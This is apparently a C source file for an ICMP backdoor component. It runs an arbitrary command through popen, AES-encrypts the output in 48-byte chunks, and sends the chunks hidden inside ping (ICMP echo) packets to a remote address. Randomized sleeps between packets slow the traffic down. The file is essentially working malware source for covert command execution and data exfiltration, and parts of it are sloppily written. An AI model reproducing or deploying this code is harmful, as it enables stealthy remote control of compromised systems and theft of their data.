#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <setjmp.h>
#include <errno.h>
#include "aes.h"
#include "icmp1.h"

#define DATA_LEN   976

char sendpack[2048];
char *buf2;

extern struct icmp*icmp;



int randnum()
{
	int j;
	srand(time(0));//time(0)
	//j = 1 + (int)(10.0 * rand() / (RAND_MAX + 1.0));
	j = 1 + (int)rand()%10;
	return j;
}





int pack(int pack_num,int pid,char *buffer)
{
	int i,packsize;
	struct icmp*icmp;
	char info[100];
	
	bzero(sendpack,2048);

	icmp = (struct icmp*)sendpack;
	
	icmp->icmp_type = ICMP_ECHO;
	
	icmp->icmp_code = 0;
	icmp->icmp_cksum = 0;
	icmp->icmp_id = pid;
	icmp->icmp_seq = pack_num;
    
	buf2 = (char*)icmp->icmp_data;
 
	
	memcpy(buf2,buffer,48);
 
	i=AES_add_pkcs7Padding(buf2,strlen(buf2));
	
	//printf("add pkcs is %s length is %d\n",buf2,i);
	
	
	AES_Encrypt(buf2,buf2,i,NULL);
	
	packsize = 8+i;
	icmp->icmp_cksum = cal_chksum( (unsigned short *)icmp,packsize);
	return packsize;
}
unsigned short cal_chksum(unsigned short *addr,int len)
{       
	int nleft=len;        
	int sum=0;        
	unsigned short *w=addr;        
	unsigned short answer=0;	    
	
	while(nleft>1)        
	{       
		sum+=*w++;                
		nleft-=2;        
	}
	
	if( nleft==1)        
	{       
		*(unsigned char *)(&answer)=*(unsigned char *)w;   
		sum+=answer;        
	}        

	sum=(sum>>16)+(sum&0xffff);        
	sum+=(sum>>16);        
	answer=~sum;        

	return answer;
}


void send_packet(int pack_num,int sockfd,int pid,char*buf, struct sockaddr_in dest_addr)
{
	int packsize,n,tol,num,j;
	char src[49];
	
	
	tol = strlen(buf);
	
	if(tol<=48){
		num = 1;
	}
	else if((tol%48)>0){
		num = (tol/48)+1;
	}
	else if((tol%48) == 0){
		num = tol/48;
	}		
	int i = 0;
	for(i = 0;i<num;i++){	
		pack_num++;
		
		bzero(src,49);
		memcpy(src,buf+(i*48),48);
		
		//printf("src is %s\n",src);
		packsize = pack(pack_num,pid,src);
		
		j = randnum();
		sleep(j);
		//printf("sleep number is %d\n",j);
		if((n = sendto(sockfd,sendpack,packsize,0,(struct sockaddr*)&dest_addr,sizeof(dest_addr) ))<0)
		{	
            perror("send error\n");
		    printf("num is %d\n",pack_num);
            exit(1);
        }
	}
		//printf("sendpack is %d\n",n);
		
}	


void turnip(unsigned long addr,char*ip,struct sockaddr_in dst){
	
	addr = inet_addr(ip);
	
	dst.sin_family = AF_INET;
	
	memcpy( (char *)&(dst.sin_addr),(char *)&addr,sizeof(unsigned long));
}


void start_cmd(char *bd_ip,char*buf,int sockfd){
	char *etc = malloc(2048);
	int pack_seq = 0;
	unsigned long inetaddr;
	struct sockaddr_in dest_addr;
	/*int i = 0;
	char*c;
	for(i;i<=strlen(buf);i++){
		if(isspace(buf[i]){
			break;
		}
	}
	char comm[i+1];
	bzero(comm,i+1); 
	memcpy(comm,buf,i);
	c = strrchr(comm,'/');*/
	
	FILE*fp = popen(buf,"r");
	fread(etc,sizeof(char),2048,fp);
	
	//printf("%s\n",etc);
	
	inetaddr = inet_addr(bd_ip);
	dest_addr.sin_family = AF_INET;
	memcpy( (char *)&(dest_addr.sin_addr),(char *)&inetaddr,sizeof(unsigned long));
	
	setuid(getuid());
	pid_t pid = getpid();
	send_packet(pack_seq,sockfd,pid,etc,dest_addr);
	//printf("end\n");
	fclose(fp);
}
	



